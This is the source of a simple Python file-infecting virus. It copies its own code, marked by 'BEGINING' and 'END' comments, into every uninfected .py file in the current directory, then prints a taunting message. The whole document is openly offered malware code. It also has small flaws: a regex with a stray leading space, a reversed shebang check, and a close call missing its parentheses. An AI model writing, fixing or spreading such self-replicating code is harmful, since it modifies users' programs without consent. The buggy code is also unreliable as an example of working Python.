## BEGINING ##

import sys, glob, re

# Get a copy of the virus

virCode = []
fhandle = open(sys.argv[0], "r")
lines = fhandle.readlines()
fhandle.close()
inVir = False

for line in lines:
    if (re.search('^ ## BEGINING ##', line)): inVir = True
    if (inVir): virCode.append(line)
    if (re.search('^## END ##', line)): break

# Find a victim (program)

progs = glob.glob("*.py")

# Cehck existing programs and infect

for prog in progs:
    fhandle = open(prog,"r")
    progCode = fhandle.readlines()
    fhandle.close()
    infected = False
    for line in progCode:
        if ('## BEGINING ##' in line):
            infected = True
            break
    if not infected:
        newCode = []
        if ('!#' in progCode[0]): newCode.append(progCode.pop(0))
        newCode.extend(virCode)
        newCode.extend(progCode)

        # New Virus infected code
        fhandle = open(prog, 'w')
        fhandle.writelines(newCode)
        fhandle.close

# Payload

print("Infected! watch out next time")

## END ##